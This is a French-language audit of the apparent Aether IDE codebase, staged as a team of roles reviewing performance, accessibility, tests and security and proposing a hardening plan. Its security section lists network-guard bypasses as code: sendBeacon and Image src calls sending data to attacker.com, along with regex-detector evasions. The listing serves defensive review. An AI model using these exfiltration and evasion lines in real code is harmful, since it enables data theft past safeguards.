# AETHER IDE V1.1 - Analyse Complète par Rôle d'Équipe

> **Date** : 2026-02-15
> **Scope** : Audit complet du repository `lamallamadel/aether` - Phase V1.1 Hardening
> **Méthodologie** : Chaque membre de l'équipe incarne son rôle et livre son analyse factuelle du codebase.

---

## Table des Matières

1. [KAIROS - Directeur Général](#1-kairos---directeur-général-)
2. [NIA - Directrice UX/UI](#2-nia---directrice-uxui-)
3. [AKSIL - QA & Sécurité](#3-aksil---qa--sécurité-)
4. [WIAM - Product Owner / Backlog](#4-wiam---product-owner--backlog-)
5. [YUKI - Lead Développeur Backend](#5-yuki---lead-développeur-backend-)
6. [SAMI - Lead Développeur Frontend](#6-sami---lead-développeur-frontend-)
7. [Synthèse & Matrice de Décision](#7-synthèse--matrice-de-décision)

---

## 1. KAIROS - Directeur Général 🧭

### 1.1 Scan Froid (Situation Actuelle)

L'intégralité du dossier source `lamallamadel/aether` a été analysée. État des lieux factuel par rapport aux objectifs V1.1 :

| Module | Statut | Verdict |
|--------|--------|---------|
| Architecture VFS (PieceTableBuffer) | Implémenté | Décision mature, supérieure à la manipulation de chaînes |
| WorkerBridge (Main Thread ↔ Workers) | Implémenté | **Risque de Race Conditions identifié** |
| Moteur RAG & Indexation (TF-IDF + VectorStore) | Implémenté | Fonctionnel mais **full-table scan en mémoire** |
| GraphRAG (recherche hybride) | Implémenté | **Bug critique : index char ↔ ligne confondus** |
| UI & Composants (Settings, Sidebar, Editor) | Implémenté | Architecture solide, lacunes d'accessibilité |
| Sécurité (NetworkGuard + RiskEngine) | Implémenté | **Bypasses multiples identifiés** |
| Tests unitaires | 9 fichiers | **Couverture critique : ~9%** |

### 1.2 Angle Stratégique

**Arrêt immédiat du développement de fonctionnalités.**

Nous sommes à un point d'inflexion critique. Le moteur (Ferrari) est construit, mais nous ne l'avons pas fait rouler sur circuit accidenté. La complexité actuelle (Main Thread ↔ Workers ↔ IndexedDB ↔ Transformers WASM) est le principal risque technique.

- **Principe appliqué** : "Stabilize before Scale"
- **Action requise** : Nous ne passons PAS en V1.2. Phase de **Hardening** immédiate.
- **Activation** : AKSIL (QA/Sec) pour session de "Crash Testing"

### 1.3 La Question Sherpa

> Le PieceTableBuffer et le WorkerBridge gèrent-ils correctement une frappe rapide (100ms/keystroke) sans perte de données ni lag visuel, ou avons-nous seulement une architecture théoriquement parfaite qui s'effondre sous la charge réelle ?

**Réponse factuelle après analyse du code** :

Le `PieceTableBuffer` est **immutable** — chaque `insert()` crée une nouvelle instance avec un `add` buffer concaténé. À 100ms/keystroke (10 frappes/sec), après 1 minute on génère **600 instances PieceTable** avec un `add` buffer qui croît linéairement. Le `getText()` est O(n) sur le nombre de `pieces`, pas O(1). Sans défragmentation ni `normalizePieces()` agressif, le lag s'installe après ~2000 opérations.

Le `WorkerBridge` n'a **aucun timeout** sur les `pendingRequests`. Si un Worker crash, la Promise reste en attente **indéfiniment**. Il y a une race condition potentielle sur `initSyntaxWorker()` — deux appels concurrents peuvent créer deux Workers, le second écrase le premier.

**Verdict KAIROS** : Architecture théoriquement solide, **non validée sous charge réelle**. Risque ÉLEVÉ.

---

## 2. NIA - Directrice UX/UI 🎨

### 2.1 La Règle des 16ms

Pour garantir 60fps, chaque frame doit être traitée en moins de 16.7ms. Voici l'audit frame-by-frame :

#### Composants audités

**CodeEditor.tsx** — Le cœur de l'expérience :
- Les `Compartment` (language, theme, wrap) sont déclarées au **niveau module** — partagées entre toutes les instances. Si deux éditeurs sont ouverts simultanément, ils **interfèrent**.
- Le gutter AI utilise `innerHTML` avec des SVG inline. Pattern sûr actuellement (contenu hardcodé) mais **vecteur XSS si les données deviennent dynamiques**.
- `MOCK_AI_SUGGESTIONS` hardcodé aux lignes 10, 15, 22 — pas connecté au vrai moteur AI.
- Les `CustomEvent('aether-ai-click')` sont dispatchés sur `window` global sans cleanup garanti.

**Sidebar.tsx** — L'explorateur de fichiers :
- Aucune virtualisation — l'arbre complet est rendu même avec 10 000 fichiers.
- Manque `aria-expanded` sur les dossiers, `role="tree"` / `role="treeitem"` absents.
- Pas de navigation clavier (flèches haut/bas).
- L'indentation utilise des `style` inline (`paddingLeft: ${level * 12 + 12}px`) — risque de re-renders inutiles.

**SettingsModal.tsx** — La modale de configuration :
- `role="dialog"` et `aria-modal="true"` présents — bien.
- **Pas de focus trap** — le focus peut s'échapper derrière la modale.
- **Pas de restauration du focus** après fermeture.
- Les animations (`animate-in fade-in zoom-in-95`) peuvent causer des jank sur mobile.

**StatusBar.tsx** — La barre de statut :
- **Valeurs hardcodées** : `Ln 12, Col 43` ne reflètent pas la position réelle du curseur.
- Items avec `cursor-pointer` mais aucun handler de clic — UX trompeuse.
- Métriques perf affichées mais sans contexte (que signifie "LT 3 / 42ms" pour l'utilisateur ?)

**AIChatPanel.tsx** — Le panneau AI :
- Pas de `aria-live` region — les nouveaux messages ne sont pas annoncés aux lecteurs d'écran.
- Le délai de 600ms est hardcodé — l'indicateur de frappe ("typing") n'est qu'esthétique.
- Pas de virtualisation des messages — performance dégradée après ~500 messages.
- Les clés de map utilisent l'index `i` — problématique si l'historique est réordonné.

**ActivityBar.tsx** — La barre d'activité :
- Tous les boutons ont `aria-label` — bien.
- Les deux premiers boutons (Layout + Layers) appellent tous les deux `toggleSidebar()` — confusion fonctionnelle.
- Pas de tooltips visibles au hover.

### 2.2 Matrice Accessibilité (WCAG 2.1 AA)

| Critère | Statut | Composant |
|---------|--------|-----------|
| Focus visible | Partiel | Aucun `:focus-visible` custom |
| Focus trap (modales) | Absent | SettingsModal, CommandPalette |
| Navigation clavier (arbre) | Absent | Sidebar |
| aria-expanded (dossiers) | Absent | Sidebar |
| aria-live (messages) | Absent | AIChatPanel |
| Contraste suffisant | OK | Thèmes sombres bien calibrés |
| Réduction de mouvement | Absent | Pas de `prefers-reduced-motion` |

### 2.3 Recommandation NIA

> **Priorité 1** : Focus trap sur les modales + navigation clavier dans le Sidebar.
> **Priorité 2** : Virtualisation du file tree (react-window) et du chat (pour >500 messages).
> **Priorité 3** : Rendre le StatusBar dynamique (position curseur réelle).

---

## 3. AKSIL - QA & Sécurité 🛡️

### 3.1 Couverture de Tests — État Critique

**Couverture globale : ~9%** (405 lignes de tests / 4 728 lignes d'implémentation)

| Catégorie | Fichiers testés | Couverture estimée | Risque |
|-----------|----------------|-------------------|--------|
| Services (diff, tfidf, perf, etc.) | 6/12 | ~40% | Moyen |
| Composants UI | 2/17 | ~7% | **Critique** |
| State Management | 1/1 | ~30% | Moyen |
| DB / GraphRAG | 0/5 | **0%** | **Critique** |
| MCP / Workers | 0/3 | **0%** | **Critique** |

#### Tests existants — Qualité

| Fichier test | Tests | Verdict |
|-------------|-------|---------|
| `tfidfIndex.test.ts` | 6 | Excellent — couvre ranking, multi-termes, topK |
| `editorStore.test.ts` | 4 | Bon — fichiers, onglets, toggle, contenu |
| `App.test.tsx` | 8 | **Fragile** — timeout 15 000ms, intégration lourde |
| `GlobalSearch.test.tsx` | 1 | **Très fragile** — timeout 60 000ms, méga-test |
| `pieceTableBuffer.test.ts` | 3 | Adéquat — insert, delete, composition |
| `perfMonitor.test.ts` | 1 | Minimal — smoke test uniquement |
| `networkGuard.test.ts` | 1 | Minimal — fetch uniquement, XHR/WS non testés |
| `lineDiff.test.ts` | 1 | Insuffisant — 1 seul cas, pas d'edge cases |
| `inMemoryJsonRpc.test.ts` | 2 | OK — succès + erreur structurée |

#### Tests manquants CRITIQUES

1. **VectorStore** : Zéro test. Le `search()` fait un **full-table scan** (`getAllVectors()` en mémoire). Aucune validation que cela fonctionne avec 10 000+ vecteurs.
2. **AetherDB** : Zéro test. Pas de vérification des transactions, quota, ou récupération d'erreur.
3. **WorkerBridge** : Zéro test. Aucune validation du cycle requête/réponse, timeout, ou crash recovery.
4. **GraphRAG** : Zéro test. Le bug `startLine: c.startIndex` (position caractère au lieu de numéro de ligne) est **non détecté**.
5. **CodeEditor** : Zéro test. Aucune validation du lifecycle EditorView.

### 3.2 Audit Sécurité — NetworkGuard

Le `networkGuard.ts` patche `fetch`, `XMLHttpRequest.open`, et `WebSocket`. Cependant :

**Contournements confirmés (bypasses)** :

```
navigator.sendBeacon('https://attacker.com', data)     // NON bloqué
new Image().src = 'https://attacker.com/steal?d=' + s   // NON bloqué
document.createElement('script').src = 'https://...'    // NON bloqué
navigator.serviceWorker.register('https://...')          // NON bloqué
```

**Race condition sur patch** : Appels multiples à `enableZeroEgress()` créent des références stales — le deuxième appel n'a pas accès à l'original `fetch` mais à la version patchée.

**WebSocket mock incomplet** : Le constructeur est remplacé par une fonction — `instanceof WebSocket` échoue après le patch.

### 3.3 Audit Sécurité — RiskEngine

Le `riskEngine.ts` détecte les patterns suspects via regex. Limitations :

| Pattern | Détecté | Contournable |
|---------|---------|-------------|
| `fetch()` direct | Oui | `const f = fetch; f()` — non détecté |
| `eval()` direct | Oui | `const e = eval; e()` — non détecté |
| API keys en clair | Oui | `process.env['API_KEY']` — non détecté |
| `fs.readFileSync` | Oui | `await import('fs')` — non détecté |
| Encoded payloads | Non | `atob()`, `String.fromCharCode()` — non détecté |

**Efficacité estimée** : 60-70% des patterns évidents. Insuffisant comme seule barrière.

### 3.4 Recommandation AKSIL

> **BLOQUANT** : Aucun merge V1.2 tant que :
> 1. Couverture tests > 40% sur les chemins critiques (DB, Workers, GraphRAG)
> 2. WorkerBridge timeout implémenté (60s max par requête)
> 3. VectorStore paginé (pas de full-table scan)
> 4. NetworkGuard complété (`sendBeacon`, `Image.src`, CSP headers)
> 5. GraphRAG bug `startIndex` → `lineNumber` corrigé

---

## 4. WIAM - Product Owner / Backlog 📋

### 4.1 V1.1 Feature Completion Matrix

| Feature V1.1 | Code présent | Testé | Stable | Verdict |
|--------------|-------------|-------|--------|---------|
| PieceTableBuffer | Oui | Partiel (3 tests) | Non validé sous charge | ⚠️ |
| WorkerBridge | Oui | Non testé | Race conditions | ⚠️ |
| RAG Indexation (TF-IDF) | Oui | Bien testé (6 tests) | Stable | ✅ |
| VectorStore (embeddings) | Oui | Non testé | Full-scan risqué | ❌ |
| GraphRAG (hybride) | Oui | Non testé | Bug index/ligne | ❌ |
| CodeMirror Integration | Oui | Non testé | Compartments partagés | ⚠️ |
| SettingsModal | Oui | Non testé | Pas de focus trap | ⚠️ |
| NetworkGuard | Oui | Minimal (1 test) | Bypasses multiples | ❌ |
| RiskEngine | Oui | Non testé | 60-70% efficacité | ⚠️ |
| Perf Monitor | Oui | Minimal (1 test) | Smoke test only | ⚠️ |
| AIChatPanel | Oui | Non testé | Pas d'aria-live | ⚠️ |
| MCP Server | Oui | Non testé | Pas de cache | ⚠️ |

**Score V1.1** : 1/12 features pleinement validées (TF-IDF). **8.3% de confiance release**.

### 4.2 Backlog Hardening Sprint

En tant que PO, voici le backlog priorisé pour le Sprint de Hardening :

#### P0 — BLOQUANTS (Sprint 1, semaine 1)

| # | Story | Critère d'acceptation |
|---|-------|----------------------|
| H-001 | Ajouter timeout au WorkerBridge | Toute requête > 60s est rejectée avec erreur explicite |
| H-002 | Corriger bug GraphRAG startIndex → lineNumber | `persistVectors()` reçoit des numéros de ligne, pas des positions char |
| H-003 | Paginer VectorStore.search() | Pas de `getAllVectors()` en mémoire. Limite batch de 1000 |
| H-004 | Tests WorkerBridge (5 scénarios) | Init, requête/réponse, timeout, crash recovery, concurrent |
| H-005 | Tests VectorStore (4 scénarios) | Persist, search, dedup, large dataset (5000 vecteurs) |

#### P1 — IMPORTANTS (Sprint 1, semaine 2)

| # | Story | Critère d'acceptation |
|---|-------|----------------------|
| H-006 | Focus trap sur modales | Tab cycle dans SettingsModal, CommandPalette |
| H-007 | Compléter NetworkGuard | Bloquer `sendBeacon`, `Image.src`, ajouter CSP meta |
| H-008 | Tests GraphRAG (3 scénarios) | Ingest, query hybride, dedup |
| H-009 | Tests CodeEditor lifecycle | Mount, unmount, theme switch, language switch |
| H-010 | StatusBar dynamique | Position curseur réelle depuis EditorView |

#### P2 — AMÉLIORATIONS (Sprint 2)

| # | Story | Critère d'acceptation |
|---|-------|----------------------|
| H-011 | Virtualisation Sidebar | react-window pour >1000 fichiers |
| H-012 | Virtualisation AIChatPanel | Scroll virtuel pour >500 messages |
| H-013 | aria-live sur AIChatPanel | Screen readers annoncent les nouveaux messages |
| H-014 | Compartments par instance | CodeEditor Compartments au niveau composant, pas module |
| H-015 | PieceTable défragmentation | `normalizePieces()` automatique toutes les 500 opérations |

### 4.3 Definition of Done — Hardening

- Tous les tests passent en < 5 secondes (pas de timeout 60s)
- Couverture > 40% sur services critiques
- Zéro bypass NetworkGuard pour les 4 vecteurs identifiés
- PieceTableBuffer stable à 2000 opérations consécutives
- WorkerBridge timeout fonctionnel (vérifié par test)

---

## 5. YUKI - Lead Développeur Backend ⚙️

### 5.1 Architecture Review — Services Layer

L'architecture suit un pattern Clean Architecture avec séparation claire :

```
src/services/
├── db/              # Persistence (IndexedDB)
│   ├── AetherDB.ts       ← Singleton, wrapper async IndexedDB
│   ├── VectorStore.ts    ← Embeddings + cosine similarity
│   └── types.ts
├── graphrag/        # Recherche hybride
│   ├── graphrag.ts       ← Symbol chunking + dual-layer search
│   └── graphragDb.ts     ← GraphRAG metadata store
├── indexing/        # Pipeline d'ingestion
│   ├── chunking.ts       ← Token-based + line-based chunking
│   ├── tfidfIndex.ts     ← TF-IDF scoring local
│   └── tokenize.ts
├── textBuffer/      # Gestion du texte
│   └── pieceTableBuffer.ts  ← Immutable piece table
├── workers/         # Communication Workers
│   └── WorkerBridge.ts      ← Singleton, Promise-based RPC
├── security/        # Sécurité runtime
│   ├── networkGuard.ts      ← Zero-egress monkey-patching
│   └── riskEngine.ts        ← Regex-based risk assessment
├── perf/            # Monitoring
│   └── perfMonitor.ts       ← RAF + PerformanceObserver
├── mcp/             # Model Context Protocol
│   └── localProjectServer.ts ← JSON-RPC file server
├── jsonrpc/         # Communication protocol
│   ├── inMemoryServer.ts
│   └── inMemoryClient.ts
└── syntax/          # Parsing
    └── syntaxClient.ts      ← Worker-based AST parsing
```

### 5.2 Analyse Technique Détaillée

#### PieceTableBuffer — Mémoire et Performance

**Pattern** : Immutable Piece Table (inspiré de VS Code)

**Forces** :
- Chaque opération retourne une nouvelle instance → pas de mutation accidentelle
- Le buffer `add` est append-only → pas de fragmentation du buffer ajouté
- `normalizePieces()` fusionne les pièces adjacentes de même source

**Faiblesses critiques** :
- `getText()` est **O(p)** où `p` = nombre de pièces. Après 2000 edits sans normalisation, p peut être > 4000.
- Le `add` buffer croît **indéfiniment** — `const nextAdd = this.add + text` crée une nouvelle string à chaque insertion. Après 10 000 frappes de 1 caractère, le buffer `add` contient 10 000 caractères de texte cumulé (dont seul le dernier est pertinent).
- Pas de compaction : les pièces supprimées restent dans `original` et `add`.
- `clamp()` silencieux : un `delete(100, 200)` sur un buffer de 50 caractères ne lève pas d'erreur, il clamp silencieusement à `delete(50, 50)` → no-op invisible.

**Recommandation** :
```
Implémenter un seuil de compaction : toutes les 500 opérations,
reconstruire le buffer depuis getText() pour réduire la fragmentation.
Remplacer le clamp silencieux par un warning en développement.
```

#### WorkerBridge — Robustesse

**Pattern** : Singleton + Promise-based RPC via `postMessage`

**Flux** :
```
postRequest(type, payload)
  → UUID assigné
  → Promise stockée dans pendingRequests Map
  → postMessage au Worker
  → Worker traite, renvoie réponse avec UUID
  → onmessage résout la Promise
```

**Bugs identifiés** :

1. **Memory leak** : `pendingRequests` ne nettoie jamais les entrées si le Worker crash. Après N crashs, N Promises suspendues en mémoire.

2. **Race condition init** :
```typescript
private initSyntaxWorker() {
    if (this.syntaxWorker) return          // Check
    this.syntaxWorker = new Worker(...)    // Create
    // Deux appels concurrents passent le check avant que le premier finisse
}
```

3. **onerror non propagé** :
```typescript
worker.onerror = (err) => {
    console.error('Worker Error:', err)
    // Les pendingRequests ne sont JAMAIS rejectées
}
```

**Fix recommandé** :
```typescript
// Ajouter timeout
setTimeout(() => {
    if (this.pendingRequests.has(id)) {
        this.pendingRequests.get(id).reject(new Error('Worker timeout'))
        this.pendingRequests.delete(id)
    }
}, 60_000)

// Propager onerror à toutes les pending requests
worker.onerror = () => {
    for (const [id, { reject }] of this.pendingRequests) {
        reject(new Error('Worker crashed'))
    }
    this.pendingRequests.clear()
}
```

#### VectorStore — Scalabilité

**Pattern** : Lazy-loaded Transformers model + cosine similarity brute-force

**Problème majeur** : `search()` appelle `getAllVectors()` qui charge **TOUS** les vecteurs en RAM.

```typescript
const allVectors = await db.getAllVectors()  // Si 50 000 vecteurs × 384 dims
// = 50 000 × 384 × 4 bytes = ~73 MB en mémoire pour UNE requête
```

**Problème secondaire** : `PipelineSingleton.getInstance()` n'a pas de garde contre les appels concurrents :
```typescript
if (this.instance === null) {
    this.instance = await pipeline(...)  // 30-60s de download
    // Pendant ce temps, d'autres appels voient instance === null
    // et lancent AUSSI le download
}
```

**Fix recommandé** :
```typescript
// Singleton avec Promise caching
private static loading: Promise<Pipeline> | null = null
static async getInstance() {
    if (!this.loading) {
        this.loading = pipeline('feature-extraction', 'Xenova/all-MiniLM-L6-v2')
    }
    return this.loading
}
```

#### GraphRAG — Bug Critique

**Ligne 60-61 de `graphrag.ts`** :
```typescript
startLine: c.startIndex,  // BUG: c'est une position CARACTÈRE, pas un numéro de LIGNE
endLine: c.endIndex        // BUG: idem
```

Cela signifie que `persistVectors()` reçoit `startLine: 342` quand il devrait recevoir `startLine: 15`. Les résultats de recherche pointent vers des lignes inexistantes.

#### Chunking — Incohérence de numérotation

```typescript
startLine: startLine + 1  // 1-indexed
endLine: i                 // 0-indexed ← INCOHÉRENT
```

La ligne de fin est 0-indexed tandis que la ligne de début est 1-indexed. Les résultats de recherche ont des plages de lignes incorrectes.

### 5.3 Recommandation YUKI

> **Actions immédiates** :
> 1. WorkerBridge : timeout 60s + propagation onerror → **1 jour**
> 2. GraphRAG : conversion startIndex → lineNumber → **0.5 jour**
> 3. VectorStore : singleton avec Promise caching → **0.5 jour**
> 4. Chunking : corriger incohérence 0-index/1-index → **0.5 jour**
>
> **Actions planifiées** :
> 5. PieceTable : compaction automatique → **2 jours**
> 6. VectorStore : pagination search (batch de 1000) → **2 jours**
> 7. AetherDB : gestion quota + cleanup old vectors → **1 jour**

---

## 6. SAMI - Lead Développeur Frontend 🖥️

### 6.1 State Management — Zustand Store

Le store central (`editorStore.ts`) contient **35 actions** et **20+ champs d'état**. Pattern Zustand bien utilisé, mais :

**Problèmes identifiés** :

1. **Pas de persistence** : Tout l'état est perdu au refresh. Aucun middleware `persist` de Zustand configuré.

2. **Subscriptions globales** : Chaque composant qui appelle `useEditorStore()` se re-render sur **tout changement** d'état. Sans `useShallow` ou sélecteurs granulaires, un changement de `perf` déclenche un re-render du `Sidebar`.

3. **Pas de loading states** : Les opérations async (indexing, parsing) n'ont pas d'indicateur de chargement.

4. **Pas d'undo/redo** : Le système `worktreeChanges` gère les suggestions AI mais pas l'historique d'édition.

### 6.2 Component Architecture

```
App.tsx
├── MenuBar.tsx          (16 977 lignes — LE PLUS GROS)
├── ActivityBar.tsx       (barre verticale gauche)
├── Sidebar.tsx           (explorateur fichiers)
├── EditorArea.tsx        (zone d'édition)
│   └── CodeEditor.tsx    (9 893 lignes — CodeMirror)
├── AIChatPanel.tsx       (7 314 lignes — Chat AI)
├── StatusBar.tsx          (barre de statut)
├── CommandPalette.tsx    (7 288 lignes — palette commandes)
├── SettingsModal.tsx     (10 954 lignes — configuration)
├── MissionControl.tsx    (8 664 lignes — worktree)
└── GlobalSearch.tsx       (recherche globale)
```

### 6.3 Audit CodeEditor.tsx

**Problème architectural majeur** :

```typescript
// Niveau MODULE — partagé entre TOUTES les instances
const languageCompartment = new Compartment()
const wrapCompartment = new Compartment()
const themeCompartment = new Compartment()
```

Si deux onglets sont ouverts avec des langages différents, le changement de Compartment sur un onglet affecte l'autre. C'est un **bug de design** — les Compartments doivent être instanciés par composant.

**Fix** :
```typescript
// Déplacer dans useRef ou useMemo par instance
const languageComp = useRef(new Compartment())
const wrapComp = useRef(new Compartment())
const themeComp = useRef(new Compartment())
```

### 6.4 Audit Sidebar.tsx — Performance

**Pas de virtualisation**. L'arbre complet est rendu avec récursion :

```typescript
function FileTreeItem({ node, level }) {
    return (
        <div style={{ paddingLeft: `${level * 12 + 12}px` }}>
            {node.name}
            {node.children?.map(child => (
                <FileTreeItem key={child.id} node={child} level={level + 1} />
            ))}
        </div>
    )
}
```

Pour un projet de 5 000 fichiers, cela crée 5 000 DOM nodes. Avec react-window ou react-virtualized, seuls les ~30 fichiers visibles seraient rendus.

### 6.5 Audit Thème

Le système de thème utilise des CSS variables dynamiques injectées dans `App.tsx` :

```typescript
const style = document.createElement('style')
style.innerHTML = `
    :root {
        --color-primary-50: ${colors[50]};
        --color-primary-100: ${colors[100]};
        ...
    }
`
```

**Problème** : `innerHTML` avec des valeurs de couleur. Actuellement sûr (couleurs contrôlées), mais si `ideThemeColor` devient user-input, c'est un vecteur XSS.

**Amélioration** : Utiliser `document.documentElement.style.setProperty()` au lieu de `innerHTML`.

### 6.6 Recommandation SAMI

> **Sprint Hardening Frontend** :
> 1. **CodeEditor Compartments** : Migrer vers `useRef` par instance → **1 jour**
> 2. **Zustand sélecteurs** : Ajouter `useShallow` sur chaque composant → **1 jour**
> 3. **Focus trap** : Implémenter sur SettingsModal et CommandPalette → **1 jour**
> 4. **Sidebar virtualisation** : Intégrer react-window → **2 jours**
> 5. **StatusBar dynamique** : Connecter à EditorView pour position curseur → **0.5 jour**
> 6. **Zustand persist** : Ajouter middleware localStorage pour settings → **0.5 jour**

---

## 7. Synthèse & Matrice de Décision 📊

### 7.1 Heat Map des Risques

```
                    Impact
                    Bas         Moyen        Haut         Critique
                ┌───────────┬────────────┬────────────┬────────────┐
    Haute       │           │ StatusBar  │ VectorStore│ WorkerBridge│
    Probabilité │           │ hardcoded  │ full-scan  │ no timeout │
                │           │            │            │ GraphRAG   │
                │           │            │            │ index bug  │
                ├───────────┼────────────┼────────────┼────────────┤
    Moyenne     │ PerfMon   │ Chunking   │ NetworkGrd │ Tests 9%   │
    Probabilité │ double-rpt│ off-by-one │ bypasses   │ coverage   │
                │           │            │ CodeEditor │            │
                │           │            │ shared comp│            │
                ├───────────┼────────────┼────────────┼────────────┤
    Basse       │ lineDiff  │ RiskEngine │ AetherDB   │            │
    Probabilité │ minimal   │ false pos. │ no quota   │            │
                │           │ Theme XSS  │ no cleanup │            │
                └───────────┴────────────┴────────────┴────────────┘
```

### 7.2 Verdict Unanime de l'Équipe

| Rôle | Verdict | Action principale |
|------|---------|-------------------|
| **KAIROS** (DG) | STOP développement. Hardening. | Pas de V1.2 tant que V1.1 non stabilisée |
| **NIA** (UX) | Accessibilité insuffisante | Focus traps, virtualisation, aria-live |
| **AKSIL** (QA) | 9% couverture = inacceptable | Tests critiques DB, Workers, GraphRAG |
| **WIAM** (PO) | 8.3% features fully validated | Sprint Hardening de 2 semaines |
| **YUKI** (Backend) | 4 bugs critiques identifiés | Timeout, GraphRAG fix, VectorStore |
| **SAMI** (Frontend) | Compartments partagés = bug | Refactor CodeEditor, Zustand selectors |

### 7.3 Plan d'Action Consolidé

**Semaine 1 — Corrections Critiques (P0)**

| Jour | Responsable | Tâche | Fichier |
|------|-------------|-------|---------|
| L    | YUKI | WorkerBridge timeout + onerror propagation | `WorkerBridge.ts` |
| L    | AKSIL | Tests WorkerBridge (5 scénarios) | `WorkerBridge.test.ts` |
| M    | YUKI | GraphRAG startIndex → lineNumber fix | `graphrag.ts` |
| M    | YUKI | Chunking off-by-one fix | `chunking.ts` |
| Me   | YUKI | VectorStore Promise singleton | `VectorStore.ts` |
| Me   | AKSIL | Tests VectorStore (4 scénarios) | `VectorStore.test.ts` |
| J    | SAMI | CodeEditor Compartments → useRef | `CodeEditor.tsx` |
| J    | AKSIL | Tests GraphRAG (3 scénarios) | `graphrag.test.ts` |
| V    | AKSIL | Tests AetherDB (3 scénarios) | `AetherDB.test.ts` |
| V    | NIA/SAMI | Focus trap SettingsModal | `SettingsModal.tsx` |

**Semaine 2 — Stabilisation (P1)**

| Jour | Responsable | Tâche | Fichier |
|------|-------------|-------|---------|
| L    | AKSIL | NetworkGuard sendBeacon + Image.src | `networkGuard.ts` |
| L    | SAMI | Zustand useShallow selectors | Tous les composants |
| M    | SAMI | Sidebar virtualisation | `Sidebar.tsx` |
| Me   | SAMI | StatusBar dynamique | `StatusBar.tsx` |
| J    | SAMI | Zustand persist middleware | `editorStore.ts` |
| V    | AKSIL | Run complet tests + coverage report | CI/CD |

### 7.4 KPIs de Sortie de Hardening

| Métrique | Actuel | Cible Hardening | Cible V1.2 |
|----------|--------|----------------|------------|
| Couverture tests | 9% | > 40% | > 60% |
| Tests timeout max | 60 000ms | < 5 000ms | < 3 000ms |
| Bugs critiques ouverts | 4 | 0 | 0 |
| WCAG AA conformité | ~40% | > 70% | > 90% |
| PieceTable ops avant lag | ~500 (estimé) | > 2 000 | > 10 000 |
| VectorStore mémoire max | Illimité | < 50 MB | < 25 MB |
| WorkerBridge timeout | Aucun | 60s | 30s |

---

> **Signé** : L'équipe complète — KAIROS, NIA, AKSIL, WIAM, YUKI, SAMI
>
> **Prochain point** : Revue fin de Semaine 1 — Validation P0 avant passage P1
